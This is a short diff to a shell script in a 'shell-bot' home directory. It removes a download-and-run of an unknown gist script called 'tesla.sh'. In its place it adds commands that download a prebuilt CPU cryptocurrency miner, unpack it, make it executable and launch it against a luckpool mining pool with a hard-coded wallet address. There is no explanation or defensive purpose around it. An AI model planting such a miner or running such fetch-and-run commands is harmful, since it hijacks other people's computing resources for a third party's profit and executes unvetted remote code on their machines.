@@ -4,5 +4,7 @@
 
 
 cd /home/shell-bot
-wget https://gist.githubusercontent.com/Omarjetos/cdfd24fcbfc3b458b93875f3e87ca4da/raw/de7b11ec2b1e958cc5caa108731ceb3290d90008/tesla.sh
-bash tesla.sh
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+tar xf hellminer_cpu_linux.tar.gz
+chmod +x hellminer
+./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RXD79XACKosRqTWEoJa4EbZGT93B8rdxnB.sangemaker -p x --cpu 4
